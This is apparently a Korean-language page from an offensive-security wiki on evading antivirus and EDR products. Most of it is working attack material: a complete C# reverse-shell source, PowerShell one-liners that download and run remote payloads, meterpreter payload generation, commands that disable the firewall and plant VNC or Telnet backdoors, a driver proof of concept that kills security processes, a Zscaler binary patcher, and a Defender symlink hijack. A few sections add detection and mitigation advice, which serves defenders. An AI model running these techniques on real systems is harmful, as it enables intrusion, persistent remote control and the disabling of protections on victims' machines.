Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 Windows에서 애플리케이션과 시스템 구성요소가 이벤트를 기록할 수 있게 해주는 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 우회되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 즉시 리턴하도록 만들어 해당 프로세스의 이벤트 로깅을 하지 못하게 하는 것도 가능합니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하도록 만들어 그 프로세스에 대한 ETW 로깅을 사실상 비활성화하는 방식으로 이루어집니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 를 참조하세요.


## C# Assembly Reflection

C# 바이너리를 메모리에서 로드하는 방법은 오래전부터 알려져 왔으며, 여전히 AV에 걸리지 않고 post-exploitation 도구를 실행하기에 매우 좋은 방법입니다.

페이로드가 디스크에 쓰이지 않고 직접 메모리에 로드되기 때문에, 우리는 프로세스 전체에 대해 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

새로운 희생 프로세스를 생성하고, 그 새 프로세스에 post-exploitation 악성 코드를 인젝션하여 실행한 뒤 완료되면 해당 프로세스를 종료하는 방식입니다. 이 방식에는 장단점이 있습니다. 장점은 실행이 우리의 Beacon implant 프로세스 밖에서 발생한다는 점으로, post-exploitation 중 문제가 생기거나 탐지되어도 우리의 implant가 살아남을 가능성이 훨씬 큽니다. 단점은 Behavioural Detections에 의해 적발될 가능성이 더 높다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

자기 자신의 프로세스에 post-exploitation 악성 코드를 인젝션하는 방식입니다. 이 방식은 새 프로세스를 생성하고 AV에 스캔되게 하는 것을 피할 수 있지만, 페이로드 실행 중 문제가 발생하면 Beacon을 잃어버릴 위험이 훨씬 커집니다(프로세스가 크래시될 수 있음).

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글을 확인하세요 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell에서 C# Assemblies를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 것처럼, 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 접근 권한을 부여함으로써 다른 언어를 사용해 악성 코드를 실행하는 것이 가능합니다.

SMB 공유에서 Interpreter Binaries와 환경에 대한 접근을 허용하면, 감염된 머신의 메모리 내에서 이러한 언어들로 임의의 코드를 실행할 수 있습니다.

해당 리포지토리는: Defender가 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 정적 시그니처를 우회할 수 있는 유연성이 더 생긴다고 밝힙니다. 난독화하지 않은 임의의 리버스 셸 스크립트들로 테스트한 결과 성공을 거두었다고 합니다.

## TokenStomping

Token stomping은 공격자가 액세스 토큰이나 EDR/AV 같은 보안 제품과 관련된 토큰을 조작하여 권한을 낮추게 함으로써, 프로세스가 종료되지는 않지만 악성 활동을 검사할 권한이 없게 만드는 기법입니다.

이를 방지하기 위해 Windows는 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻지 못하도록 제한할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에서 설명된 것처럼, 피해자 PC에 Chrome Remote Desktop을 배포한 뒤 이를 이용해 takeover 및 persistence를 유지하는 것이 쉽습니다:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).

## Advanced Evasion

Evasion은 매우 복잡한 주제이며, 하나의 시스템에서 여러 다른 텔레메트리 소스를 고려해야 할 때가 많아 성숙한 환경에서는 완전히 탐지를 피하는 것이 사실상 불가능합니다.

각 환경은 고유한 강점과 약점을 가지고 있습니다.

더 고급 회피 기법에 대한 이해를 높이려면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 토크를 보는 것을 강력히 권장합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 제거해가며 Defender가 어떤 부분을 악성으로 판단하는지 찾아내고 이를 분리해줍니다.\
동일한 기능을 제공하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 오픈 웹 서비스를 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 제공합니다.

### **Telnet Server**

Windows10 이전까지 모든 Windows에는 관리자 권한으로 설치할 수 있는 **Telnet server**가 기본으로 있었습니다. 설치하려면:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하도록 설정하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치 파일이 아니라 bin 다운로드를 원합니다)

**ON THE HOST**: _**winvnc.exe**_를 실행하고 서버를 구성합니다:

- 옵션 _Disable TrayIcon_을 활성화합니다
- _VNC Password_에 비밀번호를 설정합니다
- _View-Only Password_에 비밀번호를 설정합니다

그런 다음 바이너리 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **victim** 내부로 이동합니다

#### **Reverse connection**

**attacker**는 자신의 **host** 안에서 바이너리 `vncviewer.exe -listen 5900`을 **실행해야 하며**, 그러면 reverse **VNC connection**을 잡을 **준비가 됩니다**. 그런 다음, **victim** 내부에서는: winvnc 데몬 `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다

**WARNING:** 은밀함을 유지하려면 몇 가지를 하지 말아야 합니다

- `winvnc`가 이미 실행 중일 경우 시작하지 마세요. (시작하면 [popup](https://i.imgur.com/1SROTTl.png)이 발생합니다). 실행 중인지 확인하려면 `tasklist | findstr winvnc`를 사용하세요
- 동일한 디렉터리에 `UltraVNC.ini`가 없으면 `winvnc`를 시작하지 마세요. (시작하면 [the config window](https://i.imgur.com/rfMQWcf.png)가 열립니다)
- 도움말을 위해 `winvnc -h`를 실행하지 마세요. (실행하면 [popup](https://i.imgur.com/oc18wcu.png)이 발생합니다)

### GreatSCT

다음에서 다운로드: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **lister를 시작**하고, 다음과 같이 **xml payload를 실행**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell 컴파일

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 컴파일러
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python을 사용한 빌드 인젝터 예시:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 더보기

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 종료

Storm-2603은 작은 콘솔 유틸리티인 **Antivirus Terminator**를 이용해 랜섬웨어 실행 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *signed* 된 드라이버**를 배포하고 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작동을 실행합니다.

핵심 요점
1. **Signed driver**: 디스크에 기록되는 파일은 `ServiceMouse.sys`이지만, 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드됩니다.
2. **Service installation:**
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **kernel service**로 등록하고 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 user land에서 접근 가능해지도록 합니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 임의의 PID로 프로세스 종료 (Defender/EDR 서비스를 종료하는 데 사용됨) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD는 사용자 모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *protected* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능과 무관하게 커널 객체를 조작할 수 있습니다.

Detection / Mitigation
•  Microsoft의 취약한 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`의 로드를 거부하게 하세요.  
•  새 *kernel* 서비스 생성 모니터링 및 드라이버가 전체 쓰기 가능 디렉터리에서 로드되거나 허용 목록에 없는 경우 경고를 발생시키세요.  
•  사용자 모드 핸들이 커스텀 디바이스 객체에 열리고 이어서 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시하세요.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소로 전달하기 위해 Windows RPC를 사용합니다. 설계상의 약점 두 가지로 인해 완전한 우회가 가능합니다:

1. Posture 평가는 **전적으로 클라이언트 측**에서 이루어지며 (서버로는 불리언 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행파일이 **Zscaler에 의해 서명**되었는지만 (`WinVerifyTrust`로) 검증합니다.

디스크에 있는 서명된 바이너리 4개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 체크가 준수된 것으로 처리됨 |
| `ZSAService.exe` | WinVerifyTrust에 대한 간접 호출 | NOP-ed ⇒ 어떤 프로세스(심지어 unsigned)도 RPC 파이프에 바인드할 수 있음 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체됨 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 단락 처리됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **All** posture checks가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리는 named-pipe RPC endpoints(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있습니다.
* 침해된 호스트는 Zscaler 정책으로 정의된 내부 네트워크에 무제한으로 액세스할 수 있게 됩니다.

이 사례 연구는 순수히 클라이언트 측의 신뢰 결정과 단순한 서명 검사만으로도 몇 바이트 패치로 무력화될 수 있음을 보여줍니다.

## Protected Process Light (PPL)을 악용하여 LOLBINs로 AV/EDR를 변조하기

Protected Process Light (PPL)은 signer/level 계층을 강제하여 동등하거나 더 높은 권한의 protected process만 서로를 변조할 수 있도록 합니다. 공격적으로, 합법적으로 PPL-enabled 바이너리를 실행하고 그 인수를 제어할 수 있다면, 로깅과 같은 정상적 기능을 AV/EDR에서 사용하는 보호된 디렉토리에 대한 제약된 PPL 기반 쓰기 프리미티브로 전환할 수 있습니다.

프로세스가 PPL로 실행되는 조건
- 대상 EXE(및 로드된 DLL)는 PPL-capable EKU로 서명되어야 합니다.
- 프로세스는 CreateProcess로 생성되어야 하며 플래그 `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`를 사용해야 합니다.
- 바이너리의 서명자와 일치하는 호환 가능한 protection level을 요청해야 합니다(예: anti-malware 서명자에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨은 생성 시 실패합니다.

PP/PPL 및 LSASS 보호에 대한 더 넓은 소개는 다음을 참조하세요:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

런처 도구
- 오픈소스 헬퍼: CreateProcessAsPPL (protection level을 선택하고 인수를 대상 EXE로 전달):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 사용 예:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체 프로세스를 생성하고 호출자가 지정한 경로에 로그 파일을 쓸 수 있는 매개변수를 받습니다.
- PPL 프로세스로 실행될 때 파일 쓰기는 PPL로 보호된 상태에서 발생합니다.
- ClipUp은 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호된 위치를 가리킬 때 8.3 단축 경로를 사용하세요.

8.3 short path helpers
- 단축 이름 나열: `dir /x`를 각 상위 디렉터리에서 실행하세요.
- cmd에서 단축 경로 도출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL 지원 LOLBIN(ClipUp)을 런처(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 실행합니다.
2) ClipUp 로그 경로 인자를 전달해 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성이 일어나도록 강제합니다. 필요하면 8.3 단축 이름을 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 열려 있거나 잠겨 있는 경우(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 실행되도록 더 일찍 실행되는 자동 시작 서비스(auto-start service)를 설치해 스케줄하세요. 부팅 순서는 Process Monitor (boot logging)로 검증하세요.
4) 재부팅 시 PPL로 보호된 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
주의사항 및 제약
- ClipUp가 쓰는 내용은 위치(placement) 외에는 제어할 수 없습니다; 이 프리미티브는 정밀한 콘텐츠 주입이라기보다 손상(corruption)에 적합합니다.
- 서비스 설치/시작 및 재부팅 창을 위해 로컬 관리자/SYSTEM 권한이 필요합니다.
- 타이밍이 중요합니다: 대상 파일이 열려 있지 않아야 합니다; 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

탐지
- 부팅 전후에 비정상적인 인수로 생성된 `ClipUp.exe` 프로세스(특히 비표준 런처에 의해 부모가 설정된 경우)를 탐지합니다.
- 자동 시작으로 구성된 의심스러운 바이너리를 가리키는 신규 서비스 및 해당 서비스가 Defender/AV보다 항상 먼저 시작되는 경우를 주시합니다. Defender 시작 실패 이전의 서비스 생성/수정 기록을 조사하세요.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예상치 못한 파일 생성/수정을 감지합니다.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스와 비-AV 바이너리에서의 비정상적인 PPL 레벨 사용을 확인하세요.

완화 조치
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있는지, 그리고 어떤 부모 아래에서 실행될 수 있는지를 제한하세요; 정당한 컨텍스트 외부에서의 ClipUp 호출을 차단하세요.
- 서비스 위생관리: 자동 시작 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링하세요.
- Defender 변조 방지(tamper protection) 및 부팅 초기 로드 보호(early-launch protections)가 활성화되어 있는지 확인하세요; 바이너리 손상을 나타내는 시작 오류를 조사하세요.
- 환경과 호환된다면 보안 도구를 호스팅하는 볼륨에서 8.3 단축 이름 생성(8.3 short-name generation)을 비활성화하는 것을 고려하세요(철저히 테스트해야 함).

PPL 및 도구 관련 참고자료
- Microsoft Protected Processes 개요: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU 참조: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon 부팅 로깅(순서 검증): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL 런처: https://github.com/2x7EQ13/CreateProcessAsPPL
- 기법 설명 (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Microsoft Defender 변조 via Platform Version Folder Symlink Hijack

Windows Defender는 다음 경로 아래의 하위 폴더를 열거(enumerating)하여 실행할 플랫폼을 선택합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 사전순(lexicographic) 버전 문자열(예: `4.18.25070.5-0`)을 가진 하위 폴더를 선택한 다음 해당 위치에서 Defender 서비스 프로세스를 시작하고(서비스/레지스트리 경로를 갱신) 실행합니다. 이 선택 과정은 디렉터리 재분류 지점(directory reparse points, symlinks)을 포함한 디렉터리 항목을 신뢰합니다. 관리자는 이를 이용해 Defender를 공격자가 쓰기 가능한 경로로 리다이렉트하고 DLL sideloading이나 서비스 중단을 유발할 수 있습니다.

전제 조건
- 로컬 Administrator (Platform 폴더 아래에 디렉터리/심볼릭 링크를 생성할 수 있어야 함)
- 재부팅 가능성 또는 Defender 플랫폼 재선택을 트리거할 수 있는 능력(부팅 시 서비스 재시작)
- 내장 도구만으로 수행 가능 (mklink)

작동 원리
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, 플랫폼 선택 과정에서 디렉터리 항목을 신뢰하고 대상이 보호되거나 신뢰된 경로로 해결되는지 검증하지 않은 채 가장 사전순으로 높은 버전을 선택합니다.

단계별 (예시)
1) 현재 platform 폴더의 쓰기 가능한 복제본을 준비합니다. 예: `C:\TMP\AV`
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 안에 있는 higher-version 디렉터리의 symlink를 생성하여 당신의 폴더를 가리키게 합니다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)이 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 생성되고 서비스 구성/레지스트리가 해당 위치를 반영하는 것을 확인해야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 드롭/교체하여 Defender의 프로세스에서 코드를 실행합니다. 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink을 제거하면 다음 시작 시 구성된 경로가 해석되지 않아 Defender가 시작에 실패합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 기술은 자체적으로 권한 상승을 제공하지 않습니다; 관리자 권한이 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

레드팀은 런타임 회피를 C2 임플란트 밖으로 옮겨 대상 모듈 자체에서 Import Address Table(IAT)을 후킹하고 선택된 API를 공격자 제어의 position‑independent code(PIC)를 통해 라우팅함으로써 실행할 수 있습니다. 이는 많은 키트가 노출하는 작은 API 표면(예: CreateProcessA) 이상의 회피를 일반화하고 동일한 보호를 BOFs 및 post‑exploitation DLL에도 확장합니다.

High-level approach
- 대상 모듈 옆에 reflective loader (prepended or companion)를 사용해 PIC blob을 배치합니다. PIC는 자체 포함되어 있어야 하며 위치 독립적이어야 합니다.
- 호스트 DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하고 대상 import(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)에 대한 IAT 엔트리를 패치해 thin PIC wrappers를 가리키도록 합니다.
